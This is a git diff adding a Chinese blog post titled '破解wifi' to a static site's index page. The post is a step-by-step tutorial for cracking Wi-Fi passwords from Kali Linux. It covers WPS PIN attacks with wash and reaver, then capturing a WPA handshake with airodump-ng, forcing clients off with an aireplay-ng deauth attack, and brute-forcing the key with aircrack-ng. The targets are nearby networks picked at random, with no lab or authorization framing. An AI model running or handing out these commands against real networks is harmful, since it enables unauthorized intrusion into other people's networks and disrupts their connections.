@@ -137,6 +137,125 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-破解wifi" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/15/破解wifi/">破解wifi</a>
+    </h1>
+  
+
+        
+        <a href="/2017/08/15/破解wifi/" class="archive-article-date">
+  	<time datetime="2017-08-15T02:02:58.184Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h1><ul>
+<li><p>一个usb无线网卡</p>
+<blockquote>
+<p>芯片最好是kali支持的，这里推荐RT3070和RTL8187，我用的是RT3070的，如果你电脑自带的网卡刚好支持kali，那也可以用自带的网卡</p>
+</blockquote>
+</li>
+<li><p>kali2.0</p>
+<blockquote>
+<p>这个不用多说了吧，安装的话可以直接安装在VMware上</p>
+</blockquote>
+</li>
+</ul>
+<h1 id="WPS破解"><a href="#WPS破解" class="headerlink" title="WPS破解"></a>WPS破解</h1><p>开启了WPS的路由器可以用pin码破解，比爆破稳定多了，不过现在的路由器一般都开启了防pin功能，没有防pin功能的老路由器是肯定可以跑出pin码的，拿到了pin码，wifi密码不管如何修改都可以秒破，这里就不多说了</p>
+<h2 id="扫描是否开启WPS"><a href="#扫描是否开启WPS" class="headerlink" title="扫描是否开启WPS"></a>扫描是否开启WPS</h2><blockquote>
+<p>wifite 或者 wash -i 网卡</p>
+<h2 id="reaver破解"><a href="#reaver破解" class="headerlink" title="reaver破解"></a>reaver破解</h2><p>reaver -i 网卡 -b  目标BSSID -vv -t 10 -d 10</p>
+<h1 id="WPA-WPA2破解"><a href="#WPA-WPA2破解" class="headerlink" title="WPA/WPA2破解"></a>WPA/WPA2破解</h1><p>这个就要靠字典爆破了，爆破的成功与否取决于你的字典是否强大，爆破的工具很多，今天就只写一下用Aircrack-ng爆破吧</p>
+<h2 id="开启你的kali，插上你的网卡"><a href="#开启你的kali，插上你的网卡" class="headerlink" title="开启你的kali，插上你的网卡"></a>开启你的kali，插上你的网卡</h2><p>找到你自己的网卡并连接</p>
+</blockquote>
+<p><img src="http://img.blog.csdn.net/20170815090424744?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2tjMTExOQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="网卡"></p>
+<h2 id="查看网卡"><a href="#查看网卡" class="headerlink" title="查看网卡"></a>查看网卡</h2><blockquote>
+<p>kali终端输入ifconfig</p>
+</blockquote>
+<p><img src="http://img.blog.csdn.net/20170815091034821?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2tjMTExOQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="ifconfig"></p>
+<h2 id="开启网卡监听模式"><a href="#开启网卡监听模式" class="headerlink" title="开启网卡监听模式"></a>开启网卡监听模式</h2><blockquote>
+<p>airmon-ng start wlan0 开启monitor mode<br>wlan0是我的网卡</p>
+</blockquote>
+<p><img src="http://img.blog.csdn.net/20170815091718237?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2tjMTExOQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="wlan0mon"><br><br></p>
+<blockquote>
+<p>可以看到这里的网卡开启了监听模式<br>wlan0变成了wlan0mon</p>
+</blockquote>
+<p><img src="http://img.blog.csdn.net/20170815092054272?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2tjMTExOQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="wlan0mon-2"></p>
+<h2 id="扫描附近网络"><a href="#扫描附近网络" class="headerlink" title="扫描附近网络"></a>扫描附近网络</h2><blockquote>
+<p>airodump-ng wlan0mon</p>
+</blockquote>
+<p><img src="http://img.blog.csdn.net/20170815092511373?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2tjMTExOQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
+<h2 id="保存扫描信息"><a href="#保存扫描信息" class="headerlink" title="保存扫描信息"></a>保存扫描信息</h2><blockquote>
+<p>airodump-ng –bssid 路由器bssid -c 信道 -w 保存位置 wlan0mon<br>随便选个，就抓这个吧，BSSID：C8:3A:35:33:5D:68<br>airodump-ng –bssid C8:3A:35:33:5D:68 -c 6 -w /root/桌面/wpa-test wlan0mon<br>-c是信道 就是那个CH下面显示的数字 -w 在kali上保存的位置</p>
+</blockquote>
+<p><img src="http://img.blog.csdn.net/20170815094725488?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2tjMTExOQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img3-8"></p>
+<blockquote>
+<p>这时候扫到了更多的客户端<br>随便找一个，就这个吧 STA：00:F7:77:B7:70:64<br>这时候让他继续抓握手包，重新开一个终端</p>
+</blockquote>
+<h2 id="DeAuth攻击"><a href="#DeAuth攻击" class="headerlink" title="DeAuth攻击"></a>DeAuth攻击</h2><blockquote>
+<p>aireplay-ng –deauth 攻击次数 -a 路由器bssid -h 客户端  wlan0mon<br>aireplay-ng –deauth 5 -a C8:3A:35:33:5D:68 -h 00:F7:77:B7:70:64 wlan0mon<br>这时候另一个终端抓到了握手包</p>
+</blockquote>
+<p><img src="http://img.blog.csdn.net/20170815095219166?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2tjMTExOQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img3-9"></p>
+<h2 id="开始爆破"><a href="#开始爆破" class="headerlink" title="开始爆破"></a>开始爆破</h2><blockquote>
+<p>aircrack-ng -w 字典位置  握手包位置<br>aircrack-ng -w /dic/弱口令.txt /root/桌面/wpa-test-01.cap</p>
+</blockquote>
+<p><img src="http://img.blog.csdn.net/20170815095604384?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2tjMTExOQ==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="img3-10"></p>
+<blockquote>
+<p>等结果就行了，爆破还是很费时间的，我就不等它出结果直接关了<br>总之，kali上使用Aircrack-ng爆破就是这样啦=、=</p>
+</blockquote>
+<h2 id="Windows上爆破"><a href="#Windows上爆破" class="headerlink" title="Windows上爆破"></a>Windows上爆破</h2><blockquote>
+<p>你们可以去下个EWSA，使用GPU加速，会比Aircrack-ng爆破速度快一点，图形化操作界面，适合新手</p>
+</blockquote>
+<h2 id="还有很多种爆破工具和方法，这里就不一一列举了"><a href="#还有很多种爆破工具和方法，这里就不一一列举了" class="headerlink" title="还有很多种爆破工具和方法，这里就不一一列举了"></a>还有很多种爆破工具和方法，这里就不一一列举了</h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/08/15/破解wifi/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Markdown的使用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
